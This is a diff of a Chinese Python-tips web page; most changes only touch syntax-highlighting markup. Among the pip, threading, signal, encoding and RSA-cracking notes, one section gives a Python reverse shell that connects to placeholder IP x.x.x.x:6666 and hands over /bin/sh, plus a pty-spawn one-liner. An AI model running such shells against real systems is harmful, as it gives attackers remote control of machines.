@@ -2228,16 +2228,14 @@
 <p>当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py</p>
 <hr />
 <h2 id="pip">安装pip<a class="headerlink" href="#pip" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><code><span class="err">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</span>
-<span class="err">python get-pip.py</span>
+<div class="codehilite"><pre><span></span><code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
+python get-pip.py
 </code></pre></div>
-
 
 <h2 id="pip-mirrorsaliyuncom">设置pip源 - mirrors.aliyun.com<a class="headerlink" href="#pip-mirrorsaliyuncom" title="Permanent link">&para;</a></h2>
 <p>如果只需要一次性安装个包（如Dockerfile）： </p>
-<div class="codehilite"><pre><span></span><code><span class="err">pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span>
+<div class="codehilite"><pre><span></span><code>pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com
 </code></pre></div>
-
 
 <p>在Linux服务器上安装python的包时，执行这段代码可以将pip源改为国内的阿里镜像（豆瓣源似乎不再更新），能显著提高包的下载速度</p>
 <div class="codehilite"><pre><span></span><code>mkdir -p ~/.pip
@@ -2249,14 +2247,12 @@
 <span class="s2">&quot;&quot;&quot;</span>&gt;~/.pip/pip.conf
 </code></pre></div>
 
-
 <p>至于Windows用户，在用户目录下创建一个pip目录，如：C:\Users\chenyuan\pip，新建文件pip.ini，内容如下：</p>
 <div class="codehilite"><pre><span></span><code><span class="k">[global]</span>
 <span class="na">index-url</span> <span class="o">=</span> <span class="s">http://mirrors.aliyun.com/pypi/simple/</span>
 <span class="k">[install]</span>
 <span class="na">trusted-host</span><span class="o">=</span><span class="s">mirrors.aliyun.com</span>
 </code></pre></div>
-
 
 <h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
 <p>首先自己的服务器上用<strong>nc -l 端口</strong></p>
@@ -2269,16 +2265,13 @@
 <span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
 </code></pre></div>
 
-
 <p>单行版本：</p>
 <div class="codehilite"><pre><span></span><code><span class="n">IP</span><span class="o">=</span><span class="s2">&quot;x.x.x.x&quot;</span><span class="p">;</span><span class="n">PORT</span><span class="o">=</span><span class="mi">6666</span><span class="p">;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span> <span class="n">IP</span> <span class="p">,</span> <span class="n">PORT</span> <span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
 </code></pre></div>
 
-
 <h3 id="tty">获得一个tty<a class="headerlink" href="#tty" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="requestsip">让requests使用多个IP<a class="headerlink" href="#requestsip" title="Permanent link">&para;</a></h2>
@@ -2319,7 +2312,6 @@
 <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">bakup_create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">mynewip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="python_1">Python多线程模板<a class="headerlink" href="#python_1" title="Permanent link">&para;</a></h2>
 <p>使用threading模块进行开发</p>
@@ -2338,7 +2330,6 @@
 <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
 </code></pre></div>
 
-
 <p>怎么知道MyHTTPServer的父类确实被修改了呢？ 可以查看其__mro__属性（Method Resolution Order attribute）</p>
 <h3 id="old-version">Old version 修改库代码(不建议)<a class="headerlink" href="#old-version" title="Permanent link">&para;</a></h3>
 <blockquote>
@@ -2350,30 +2341,25 @@
 <div class="codehilite"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import http.server; print(http.server)&quot;</span>
 </code></pre></div>
 
-
 <p>修改其提示的文件，例如我这里是<code>/usr/lib/python3.4/http/server.py</code></p>
 <p>搜索<code>class HTTPServer</code>，如果是用vim可以用<code>/class HTTPServer</code></p>
 <p>修改找到的这一行，改为：</p>
 <div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">):</span>
 </code></pre></div>
 
-
 <p><strong>Python2的方法</strong>：</p>
 <p>首先找到BaseHTTPServer在哪：</p>
 <div class="codehilite"><pre><span></span><code> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import BaseHTTPServer; print(BaseHTTPServer)&quot;</span>
 </code></pre></div>
-
 
 <p>修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py，注意不要打开他直接提示的pyc文件而是要对应的同名py文件</p>
 <p>找到这行（vim中可以输入<code>/class HTTPServer</code>进行搜索）：</p>
 <div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">):</span>
 </code></pre></div>
 
-
 <p>修改其继承的父类：</p>
 <div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">):</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="rootpython">无root权限安装Python<a class="headerlink" href="#rootpython" title="Permanent link">&para;</a></h2>
@@ -2388,10 +2374,9 @@
 <span class="n">pushd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">chenyuan</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">bin</span>
 <span class="n">cp</span> <span class="n">python3</span> <span class="n">python</span>
 <span class="n">cp</span> <span class="n">pip3</span> <span class="n">pip</span>
-<span class="n">alias</span> <span class="n">python3</span><span class="o">=</span><span class="n">`pwd`</span><span class="o">/</span><span class="n">python</span>
-<span class="n">alias</span> <span class="n">pip3</span><span class="o">=</span><span class="n">`pwd`</span><span class="o">/</span><span class="n">pip</span>
+<span class="n">alias</span> <span class="n">python3</span><span class="o">=</span><span class="n n-Quoted">`pwd`</span><span class="o">/</span><span class="n">python</span>
+<span class="n">alias</span> <span class="n">pip3</span><span class="o">=</span><span class="n n-Quoted">`pwd`</span><span class="o">/</span><span class="n">pip</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="_1">中文输出乱码问题<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
@@ -2399,21 +2384,18 @@
 <div class="codehilite"><pre><span></span><code><span class="nb">export</span> <span class="nv">PYTHONIOENCODING</span><span class="o">=</span>utf8
 </code></pre></div>
 
-
 <p>方法2：强制修改stdout</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">closefd</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">closefd</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="pep8">遵循PEP8检查你的代码<a class="headerlink" href="#pep8" title="Permanent link">&para;</a></h2>
 <p><a href="https://github.com/PyCQA/pycodestyle">pycodestyle</a></p>
 <p>安装并使用pycodestyle检查代码，忽略E501一行不能长于80个字符的限制：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">pip install pycodestyle</span>
-<span class="err">pycodestyle --show-source --ignore=E501 yourcode.py</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">pip</span> <span class="nv">install</span> <span class="nv">pycodestyle</span>
+<span class="nv">pycodestyle</span> <span class="o">--</span><span class="k">show</span><span class="o">-</span><span class="nv">source</span> <span class="o">--</span><span class="nv">ignore</span><span class="o">=</span><span class="nv">E501</span> <span class="nv">yourcode</span>.<span class="nv">py</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="_2">生成随机字符串<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
@@ -2422,7 +2404,6 @@
 <span class="k">def</span> <span class="nf">random_str</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
     <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">length</span><span class="p">))</span>
 </code></pre></div>
-
 
 <div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
 <span class="k">def</span> <span class="nf">random_str</span><span class="p">(</span><span class="n">randomlength</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
@@ -2435,7 +2416,6 @@
     <span class="k">return</span> <span class="nb">str</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="python_2">Python解方程<a class="headerlink" href="#python_2" title="Permanent link">&para;</a></h2>
 <p>需要 <code>pip install sympy</code></p>
@@ -2443,42 +2423,38 @@
 <span class="c1"># 解一元方程：</span>
 <span class="c1">#   2x^2-18=0</span>
 <span class="n">x</span><span class="o">=</span><span class="n">Symbol</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">solve</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="o">-</span><span class="mi">18</span><span class="p">,</span><span class="n">x</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">solve</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="o">-</span><span class="mi">18</span><span class="p">,</span><span class="n">x</span><span class="p">))</span>
 <span class="c1"># 得到[-3,3]</span>
 
 <span class="c1"># 解方程组</span>
 <span class="c1">#   y=1-x</span>
 <span class="c1">#   3x+2y-5</span>
 <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">symbols</span><span class="p">(</span><span class="s1">&#39;x y&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">solve</span><span class="p">([</span> <span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="n">x</span><span class="p">,</span> <span class="mi">3</span><span class="o">*</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">y</span><span class="o">-</span><span class="mi">5</span> <span class="p">],</span> <span class="p">[</span> <span class="n">x</span> <span class="p">,</span> <span class="n">y</span> <span class="p">]))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">solve</span><span class="p">([</span> <span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="n">x</span><span class="p">,</span> <span class="mi">3</span><span class="o">*</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">y</span><span class="o">-</span><span class="mi">5</span> <span class="p">],</span> <span class="p">[</span> <span class="n">x</span> <span class="p">,</span> <span class="n">y</span> <span class="p">]))</span>
 <span class="c1"># 得到{x: 3, y: -2}</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="in">大数据判断in<a class="headerlink" href="#in" title="Permanent link">&para;</a></h2>
 <p>一定要用set，因为set的in操作是O(1)的，用list是O(n)速度太慢</p>
 <hr />
 <h2 id="pythonh-no-such-file-or-directory">解决Python.h: No such file or directory<a class="headerlink" href="#pythonh-no-such-file-or-directory" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><code><span class="err">apt-get install -y python-dev python3-dev</span>
+<div class="codehilite"><pre><span></span><code>apt-get install -y python-dev python3-dev
 </code></pre></div>
-
 
 <p>如果为CentOS系统：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">yum install python-devel</span>
+<div class="codehilite"><pre><span></span><code>yum install python-devel
 </code></pre></div>
-
 
 <hr />
 <h2 id="_3">二进制字符串转普通字符串<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <p>方法一：将字符串每8个分成一组，用int转10进制，再用chr转为ascii字符</p>
-<div class="codehilite"><pre><span></span><code><span class="err">s=&quot;0110001101111001&quot;</span>
-<span class="err">ans=&quot;&quot;</span>
-<span class="err">for i in range(0,len(s)//8):</span>
-<span class="err">    x = s[i*8:i*8+8]</span>
-<span class="err">    ans+=chr(int(x,2))</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">s</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">0110001101111001</span><span class="s2">&quot;</span>
+<span class="nv">ans</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
+<span class="k">for</span> <span class="nv">i</span> <span class="nv">in</span> <span class="nv">range</span><span class="ss">(</span><span class="mi">0</span>,<span class="nv">len</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span><span class="o">//</span><span class="mi">8</span><span class="ss">)</span>:
+    <span class="nv">x</span> <span class="o">=</span> <span class="nv">s</span>[<span class="nv">i</span><span class="o">*</span><span class="mi">8</span>:<span class="nv">i</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">8</span>]
+    <span class="nv">ans</span><span class="o">+=</span><span class="nv">chr</span><span class="ss">(</span><span class="nv">int</span><span class="ss">(</span><span class="nv">x</span>,<span class="mi">2</span><span class="ss">))</span>
 </code></pre></div>
-
 
 <p>方法二：利用binascii，先用int转为10进制，然后转为16进制字符串，调用unhexlify执行翻译</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">binascii</span>
@@ -2486,21 +2462,18 @@
 <span class="n">ans</span><span class="o">=</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
 </code></pre></div>
 
-
 <p>补充：相应的如果要把十进制转为二进制，可以用bin(123)[2:]</p>
 <hr />
 <h2 id="bytes">十六进制字符串转bytes字符串<a class="headerlink" href="#bytes" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16encode</span><span class="p">,</span><span class="n">b16decode</span>
-<span class="k">print</span><span class="p">(</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;py3.io&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">)</span> <span class="c1">#output: 7079332E696F</span>
-<span class="k">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span><span class="s2">&quot;7079332E696F&quot;</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span> <span class="p">)</span> <span class="c1">#output: b&#39;py3.io&#39;, 这里使用upper转大写</span>
+<span class="nb">print</span><span class="p">(</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;py3.io&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">)</span> <span class="c1">#output: 7079332E696F</span>
+<span class="nb">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span><span class="s2">&quot;7079332E696F&quot;</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span> <span class="p">)</span> <span class="c1">#output: b&#39;py3.io&#39;, 这里使用upper转大写</span>
 </code></pre></div>
-
 
 <p>相应的，拿到一个十进制数，转字符串：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">key = 5287002131074331513</span>
-<span class="err">print( b16decode( hex(key)[2:].upper() ) )#output: b&#39;I_4m-k3y&#39;</span>
+<div class="codehilite"><pre><span></span><code>key = 5287002131074331513
+print( b16decode( hex(key)[2:].upper() ) )#output: b&#39;I_4m-k3y&#39;
 </code></pre></div>
-
 
 <hr />
 <h2 id="python3pat">用Python3写PAT心得<a class="headerlink" href="#python3pat" title="Permanent link">&para;</a></h2>
@@ -2515,9 +2488,8 @@
 <hr />
 <h2 id="requestspost">用requests进行post<a class="headerlink" href="#requestspost" title="Permanent link">&para;</a></h2>
 <p>需要注意加上这两个参数：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">,allow_redirects=False,headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}</span>
+<div class="codehilite"><pre><span></span><code>,allow_redirects=False,headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
 </code></pre></div>
-
 
 <p>登录请求的时候是要根据返回的headers里面Location有没有对不对来判断登录是否成功的，而requests默认会跟随301/302跳转，导致无法获取到跳转请求的headers，所以加上<code>allow_redirects=False</code></p>
 <p>另外就是post数据的时候必须给出正确的Content-Type，否则服务器不认这个post的</p>
@@ -2540,9 +2512,8 @@
 <span class="n">root</span><span class="o">.</span><span class="n">clipboard_append</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
 <span class="c1"># 读取剪贴板 text from clipboard</span>
 <span class="n">clip_text</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">clipboard_get</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">clip_text</span><span class="p">)</span>  <span class="c1"># --&gt; Donnerwetter</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">clip_text</span><span class="p">)</span>  <span class="c1"># --&gt; Donnerwetter</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="_4">符号数与无符号数转换<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
@@ -2551,13 +2522,11 @@
 <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int64</span><span class="p">(</span><span class="mi">17039472050328044269</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
 </code></pre></div>
 
-
 <p>上述将得到-1407272023381507347</p>
 <h3 id="_6">有符号→无符号，为了去掉负号：<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
 <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="o">-</span><span class="mi">1407272023381507347</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
 </code></pre></div>
-
 
 <p>上述将得到17039472050328044269</p>
 <hr />
@@ -2567,12 +2536,11 @@
     <span class="kn">import</span> <span class="nn">signal</span>
     <span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
         <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Time is up!&quot;</span><span class="p">)</span>
-            <span class="nb">exit</span><span class="p">()</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Time is up!&quot;</span><span class="p">)</span>
+            <span class="n">exit</span><span class="p">()</span>
     <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
     <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">timeout</span><span class="p">))</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="ctrlc">捕捉用户的Ctrl+C<a class="headerlink" href="#ctrlc" title="Permanent link">&para;</a></h2>
@@ -2581,14 +2549,13 @@
 
 <span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Ctrl+C is pressed!&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Ctrl+C is pressed!&quot;</span><span class="p">)</span>
         <span class="c1">#raise KeyboardInterrupt</span>
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
     <span class="n">sleep</span><span class="p">(</span><span class="mi">666</span><span class="p">)</span>
 </code></pre></div>
-
 
 <hr />
 <h2 id="signalsigalrm-only-linux_1">使用signal.SIGALRM实现定时器 (only Linux)<a class="headerlink" href="#signalsigalrm-only-linux_1" title="Permanent link">&para;</a></h2>
@@ -2601,7 +2568,7 @@
     <span class="k">global</span> <span class="n">COUNT</span>
     <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">:</span>
         <span class="c1"># 你的定时器代码写在这里 Your function here</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Count! {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">COUNT</span><span class="p">))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Count! </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">COUNT</span><span class="p">))</span>
         <span class="n">COUNT</span><span class="o">+=</span><span class="mi">1</span>
         <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">INTERVAL</span><span class="p">))</span> <span class="c1">#再设置一个clock就能循环往复咯</span>
 
@@ -2611,18 +2578,15 @@
     <span class="n">sleep</span><span class="p">(</span><span class="mi">23333</span><span class="p">)</span>
 </code></pre></div>
 
-
 <hr />
 <h2 id="pdb">使用pdb进行调试<a class="headerlink" href="#pdb" title="Permanent link">&para;</a></h2>
 <p>在需要调试的文件头部加入</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pdb</span>
 </code></pre></div>
 
-
 <p>需要停下来的地方加入</p>
-<div class="codehilite"><pre><span></span><code><span class="err">pdb.set_trace()</span>
+<div class="codehilite"><pre><span></span><code>pdb.set_trace()
 </code></pre></div>
-
 
 <p>Tutorial: <a href="https://github.com/spiside/pdb-tutorial">https://github.com/spiside/pdb-tutorial</a></p>
 <hr />
@@ -2633,14 +2597,13 @@
 <h4 id="1api">1.API网关与函数计算的对接<a class="headerlink" href="#1api" title="Permanent link">&para;</a></h4>
 <p>按照<a href="https://help.aliyun.com/document_detail/54788.html">教程</a>，当时不够耐心，拿着hello world的程序（不要信教程中的2.1部分的截图）就在使用API网关，结果总是返回503</p>
 <p>耐心下来看文档把程序改为后面的撞墙式程序就好了，人家其实说了函数计算应该返回的数据结构，不按照这个结构来就会503：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">{</span>
-<span class="err">    &quot;isBase64Encoded&quot;: True或者False,</span>
-<span class="err">    &quot;statusCode&quot;: 200, #可以为302来实现跳转</span>
-<span class="err">    &quot;headers&quot;: {...} #返回的response headers，但其中的Content-Type没有作用</span>
-<span class="err">    &quot;body&quot;: &quot;...&quot; #返回的网页正文内容</span>
-<span class="err">}</span>
+<div class="codehilite"><pre><span></span><code>{
+    &quot;isBase64Encoded&quot;: True或者False,
+    &quot;statusCode&quot;: 200, #可以为302来实现跳转
+    &quot;headers&quot;: {...} #返回的response headers，但其中的Content-Type没有作用
+    &quot;body&quot;: &quot;...&quot; #返回的网页正文内容
+}
 </code></pre></div>
-
 
 <h4 id="2api">2.修改API网关参数定义后要再次发布<a class="headerlink" href="#2api" title="Permanent link">&para;</a></h4>
 <p>无论有没有改Mock设置，只要改动了设置都需要重新发布，发布线上版本即可</p>
@@ -2653,9 +2616,8 @@
 <p>然后用<code>fcli.exe shell</code>的<code>mkf</code>再上传一次，调用函数还是老样子<code>Unable to import module 'index'</code>，令人很抓狂。。。</p>
 <p>突然想到不能被import应该是全局的import失败了，多次折腾后，把<code>from grabber import grabber</code>移动到index函数中，总算得到了明确的报错：还是<code>ImportError: No module named 'bs4'</code>；哈？这是什么鬼，明明我都把bs4文件夹放到代码目录下了，为啥还是报错？</p>
 <p>既然他说import失败，会不会是Python搜索包的PATH的问题，于是Google到了把当前文件所在的目录加入搜索的方法：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">sys.path.append(os.path.dirname(os.path.abspath(__file__)))</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">sys</span>.<span class="nv">path</span>.<span class="nv">append</span><span class="ss">(</span><span class="nv">os</span>.<span class="nv">path</span>.<span class="k">dirname</span><span class="ss">(</span><span class="nv">os</span>.<span class="nv">path</span>.<span class="nv">abspath</span><span class="ss">(</span><span class="nv">__file__</span><span class="ss">)))</span>
 </code></pre></div>
-
 
 <p>Orz, 还是没有用。。。</p>
 <p>想到既然部署后代码文件夹<code>/code</code>没有我需要的依赖包，那<code>/code</code>文件夹里面到底有啥呢？果断fuck一下，在index函数开头写上:</p>
@@ -2664,7 +2626,6 @@
     <span class="kn">import</span> <span class="nn">bs4</span> <span class="c1">#会出错的import</span>
     <span class="o">...</span><span class="c1">#正常代码</span>
 </code></pre></div>
-
 
 <p>总算调用成功了，然后一看输出结果，woc! (内心中骂了多次mdzz阿里云</p>
 <p>给张截图：</p>
@@ -2690,64 +2651,56 @@
 <p>参考：https://stackoverflow.com/questions/4078902/cracking-short-rsa-keys</p>
 <p>Google搜索关键词 crack rsa key</p>
 <p>给定公钥n和e，假定我们成功分解n = p * q，那么求出d</p>
-<div class="codehilite"><pre><span></span><code><span class="err">d = e^-1 mod phi(n)</span>
-<span class="err">  = e^-1 mod (p-1)*(q-1)</span>
+<div class="codehilite"><pre><span></span><code>d = e^-1 mod phi(n)
+  = e^-1 mod (p-1)*(q-1)
 </code></pre></div>
-
 
 <p>现在我们有了私钥d，可以对密文c解密得到明文m：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">m = c^d (mod n)</span>
+<div class="codehilite"><pre><span></span><code>m = c^d (mod n)
 </code></pre></div>
-
 
 <h3 id="_10">实现它<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
 <h4 id="ne">题目给的公钥是啥格式，怎么读取出N和e?<a class="headerlink" href="#ne" title="Permanent link">&para;</a></h4>
 <p>题目给的公钥是这样的：</p>
-<div class="codehilite"><pre><span></span><code><span class="err">-----BEGIN PUBLIC KEY-----</span>
-<span class="err">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb</span>
-<span class="err">e+fuqvuwBPUfAgMBAAE=</span>
-<span class="err">-----END PUBLIC KEY-----</span>
+<div class="codehilite"><pre><span></span><code><span class="gh">-----BEGIN PUBLIC KEY-----</span><span class="w"></span>
+<span class="s">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb</span><span class="w"></span>
